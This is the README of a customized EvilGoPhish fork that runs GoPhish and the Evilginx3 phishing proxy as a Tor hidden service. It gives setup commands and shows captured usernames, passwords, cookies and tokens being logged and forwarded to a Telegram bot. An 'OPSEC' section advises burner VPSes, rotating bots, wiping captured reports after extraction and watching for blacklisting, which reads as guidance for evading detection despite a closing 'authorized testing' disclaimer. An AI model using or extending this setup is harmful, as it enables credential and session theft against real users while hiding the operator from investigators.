# EvilGoPhish for Hidden Services (.onion)

This is a customized version of EvilGoPhish specifically designed for Ubuntu VPS and Tor hidden services, with automatic credential reporting and systemd service management.

## Features

- ✅ Full support for Tor hidden services (.onion domains)
- ✅ Automatic session and credential reporting to local filesystem
- ✅ Telegram bot integration for real-time credential notifications
- ✅ Systemd service with automatic restart and 2-hour timer
- ✅ Production-ready configuration for Ubuntu VPS
- ✅ Security-focused setup with system hardening compatibility
- ✅ Comprehensive logging and monitoring

## Quick Installation

### Prerequisites
- Ubuntu 20.04+ VPS with root access
- Internet connection for initial setup
- (Optional) Telegram bot token and chat ID

### Installation Steps

```bash
# Clone the repository
git clone https://github.com/bitbybit91/evilgophish.git
cd evilgophish

# Run the setup script
sudo ./setup_hidden_services.sh <onion_domain> <rid_param> [telegram_token] [telegram_chat_id]

# Example without Telegram
sudo ./setup_hidden_services.sh abc123xyz456.onion user_id

# Example with Telegram
sudo ./setup_hidden_services.sh abc123xyz456.onion user_id 123456:ABC-DEF -987654321
```

### What the Setup Does

1. Installs system dependencies (Tor, Go, build tools)
2. Configures Tor hidden service
3. Builds all components (GoPhish, Evilginx3, EvilFeed, Report Monitor)
4. Sets up report directories
5. Configures Telegram notifications (if provided)
6. Installs systemd services
7. Creates comprehensive documentation

## Getting Your .onion Address

After installation, retrieve your hidden service address:

```bash
sudo cat /var/lib/tor/evilgophish/hostname
```

This is the address you'll use for your phishing campaigns.

## Configuration

### Directory Structure

```
/opt/evilgophish/
├── evilginx3/           # Evilginx3 proxy
├── gophish/             # GoPhish backend
├── evilfeed/            # Live feed server
├── report_monitor/      # Credential reporting service
├── reports/             # Captured sessions and credentials
│   ├── sessions/        # Complete session data
│   ├── credentials/     # Quick credential reference
│   └── raw/             # Raw data dumps
├── logs/                # Application logs
├── systemd/             # Systemd service files
├── start_all.sh         # Start all services
├── stop_all.sh          # Stop all services
└── telegram_config.json # Telegram configuration
```

### Telegram Configuration

Edit `/opt/evilgophish/telegram_config.json`:

```json
{
  "bot_token": "YOUR_BOT_TOKEN_HERE",
  "chat_id": "YOUR_CHAT_ID_HERE",
  "enabled": true
}
```

#### How to Get Telegram Credentials

1. **Create a Bot:**
   - Message @BotFather on Telegram
   - Send `/newbot` and follow instructions
   - Copy the bot token (format: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)

2. **Get Chat ID:**
   - Message @userinfobot on Telegram
   - It will reply with your chat ID (format: `987654321` or `-987654321`)
   - Or create a group/channel and add @userinfobot to get group/channel ID

3. **Test Connection:**
   ```bash
   curl -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" \
     -d "chat_id=<CHAT_ID>" \
     -d "text=Test message"
   ```

## Service Management

### Using Systemd (Recommended)

```bash
# Start service once
sudo systemctl start evilgophish.service

# Stop service
sudo systemctl stop evilgophish.service

# Check status
sudo systemctl status evilgophish.service

# Enable automatic start on boot
sudo systemctl enable evilgophish.service

# Enable 2-hour automatic restart timer
sudo systemctl enable evilgophish.timer
sudo systemctl start evilgophish.timer

# Check timer status
sudo systemctl status evilgophish.timer
sudo systemctl list-timers

# View logs
sudo journalctl -u evilgophish.service -f
sudo journalctl -u evilgophish.service --since "1 hour ago"
```

### Manual Control

```bash
# Start all services
cd /opt/evilgophish
sudo ./start_all.sh

# Stop all services
sudo ./stop_all.sh

# Check if services are running
ps aux | grep -E "gophish|evilginx|evilfeed|report_monitor"
```

## Usage

### 1. Access the Web Interfaces

After starting services:

- **GoPhish Admin Panel:** https://localhost:3333
  - Default credentials: Check GoPhish documentation
  - Configure campaigns, templates, and groups here

- **EvilFeed Live Dashboard:** http://localhost:1337
  - Real-time event feed
  - Shows email sent, links clicked, credentials captured

### 2. Create a Phishing Campaign

1. **In GoPhish:**
   - Create email template
   - Create sending profile
   - Create target groups
   - Create campaign with your .onion URL + lure path

2. **In Evilginx3:**
   - Configure phishlet for your target
   - Create lure pointing to phishing page
   - Set up the phishing domain (your .onion address)

### 3. Monitor Results

**Real-time Monitoring:**
- Watch EvilFeed at http://localhost:1337
- Telegram notifications (if enabled)
- Check systemd logs: `sudo journalctl -u evilgophish.service -f`

**Captured Data:**
```bash
# View all captured credentials
ls -la /opt/evilgophish/reports/credentials/

# View complete session data
ls -la /opt/evilgophish/reports/sessions/

# Read a credential file
cat /opt/evilgophish/reports/credentials/20231125_143022_abc12345_creds.json
```

**Example Credential Report:**
```json
{
  "timestamp": "2023-11-25T14:30:22Z",
  "hidden_service": "abc123xyz456.onion",
  "phishlet": "microsoft",
  "username": "user@example.com",
  "password": "P@ssw0rd123",
  "ip": "192.168.1.100",
  "session_id": "abc12345-def67890"
}
```

### 4. Telegram Notifications

When credentials are captured, you'll receive a Telegram message like:

```
🔐 New Credentials Captured

🌐 Hidden Service: abc123xyz456.onion
🎯 Phishlet: microsoft
👤 Username: user@example.com
🔑 Password: P@ssw0rd123
📍 IP: 192.168.1.100
🕐 Time: 2023-11-25 14:30:22 UTC
🍪 Cookies: 15 captured
🎫 Tokens: 3 captured
```

## Security Considerations

### Hidden Service Security

1. **Never expose real IP:**
   - All traffic goes through Tor
   - Don't connect to clearnet services from the same server
   - Use separate VPS for each campaign if possible

2. **Protect the database:**
   ```bash
   chmod 600 /opt/evilgophish/gophish/gophish.db
   chmod 600 /opt/evilgophish/telegram_config.json
   ```

3. **Secure SSH access:**
   - Use key-based authentication
   - Disable password authentication
   - Change default SSH port
   - Use fail2ban

4. **Regular updates:**
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

### OPSEC Best Practices

1. **Use unique .onion address per campaign**
2. **Rotate Telegram bots between operations**
3. **Clean up reports after extraction:**
   ```bash
   rm -rf /opt/evilgophish/reports/credentials/*
   rm -rf /opt/evilgophish/reports/sessions/*
   ```
4. **Monitor for detection:**
   - Check if .onion is blacklisted
   - Monitor access logs for scanning activity
5. **Use burner VPS:**
   - Destroy after campaign
   - Never reuse

## Troubleshooting

### Tor Not Starting

```bash
# Check Tor status
sudo systemctl status tor

# View Tor logs
sudo journalctl -u tor -n 50

# Restart Tor
sudo systemctl restart tor
```

### Services Not Starting

```bash
# Check logs
sudo journalctl -u evilgophish.service -n 100

# Check individual component logs
tail -f /opt/evilgophish/logs/*.log

# Manually test each component
cd /opt/evilgophish/gophish && ./gophish
cd /opt/evilgophish/evilginx3 && ./evilginx3 -g ../gophish/gophish.db
cd /opt/evilgophish/evilfeed && ./evilfeed
cd /opt/evilgophish/report_monitor && ./report_monitor -db ~/.evilginx/data.db -reports ../reports
```

### Telegram Not Working

```bash
# Test Telegram bot manually
curl -X POST "https://api.telegram.org/bot<BOT_TOKEN>/sendMessage" \
  -d "chat_id=<CHAT_ID>" \
  -d "text=Test from evilgophish"

# Check report monitor logs
tail -f /opt/evilgophish/logs/report_monitor_*.log

# Verify telegram_config.json
cat /opt/evilgophish/telegram_config.json
```

### No Credentials Captured

1. **Check Evilginx3 is running:**
   ```bash
   ps aux | grep evilginx3
   ```

2. **Verify phishlet configuration:**
   - Is the phishlet enabled?
   - Are the sub-filters configured correctly?
   - Is the lure created?

3. **Check report monitor:**
   ```bash
   ps aux | grep report_monitor
   tail -f /opt/evilgophish/logs/report_monitor_*.log
   ```

4. **Verify database:**
   ```bash
   ls -la ~/.evilginx/data.db
   ```

### Permission Issues

```bash
# Fix ownership
sudo chown -R root:root /opt/evilgophish

# Fix permissions
sudo chmod +x /opt/evilgophish/*.sh
sudo chmod +x /opt/evilgophish/gophish/gophish
sudo chmod +x /opt/evilgophish/evilginx3/evilginx3
sudo chmod +x /opt/evilgophish/evilfeed/evilfeed
sudo chmod +x /opt/evilgophish/report_monitor/report_monitor
```

## Advanced Configuration

### Custom Check Interval for Report Monitor

Edit `/opt/evilgophish/start_all.sh` and modify the `MONITOR_CMD` line:

```bash
# Check every 10 seconds instead of default 30
MONITOR_CMD="./report_monitor -db $HOME/.evilginx/data.db -reports $REPORTS_DIR -interval 10"
```

### Custom Systemd Timer Interval

Edit `/etc/systemd/system/evilgophish.timer`:

```ini
[Timer]
OnBootSec=5min
OnUnitActiveSec=1h  # Change from 2h to 1h for hourly runs
```

Then reload:
```bash
sudo systemctl daemon-reload
sudo systemctl restart evilgophish.timer
```

### Multiple Hidden Services

To run multiple instances:

1. Install to different directories:
   ```bash
   sudo ./setup_hidden_services.sh abc1.onion user_id
   # Install to /opt/evilgophish2
   ```

2. Modify port numbers in configs
3. Create separate systemd services

## Uninstallation

```bash
# Stop and disable services
sudo systemctl stop evilgophish.service
sudo systemctl disable evilgophish.service
sudo systemctl stop evilgophish.timer
sudo systemctl disable evilgophish.timer

# Remove systemd files
sudo rm /etc/systemd/system/evilgophish.service
sudo rm /etc/systemd/system/evilgophish.timer
sudo systemctl daemon-reload

# Remove installation
sudo rm -rf /opt/evilgophish

# Remove Tor hidden service
sudo rm -rf /var/lib/tor/evilgophish

# Remove Tor config (backup first!)
sudo nano /etc/tor/torrc
# Remove the EvilGoPhish section
sudo systemctl restart tor
```

## Legal Disclaimer

This tool is for **AUTHORIZED SECURITY TESTING ONLY**. You must have explicit written permission to conduct social engineering assessments. Unauthorized use is illegal and unethical.

The authors and contributors are not responsible for misuse or illegal activities conducted with this tool.

## Support and Updates

- **Issues:** https://github.com/bitbybit91/evilgophish/issues
- **Documentation:** This file and README.md
- **Updates:** `git pull` in the repository directory

## Credits

- Original EvilGoPhish: [fin3ss3g0d](https://github.com/fin3ss3g0d)
- Evilginx3: [Kuba Gretzky](https://github.com/kgretzky)
- GoPhish: [Jordan Wright](https://github.com/jordan-wright)

## Version

Hidden Services Edition - v1.0
Built for Ubuntu VPS with Tor integration
Last updated: 2024
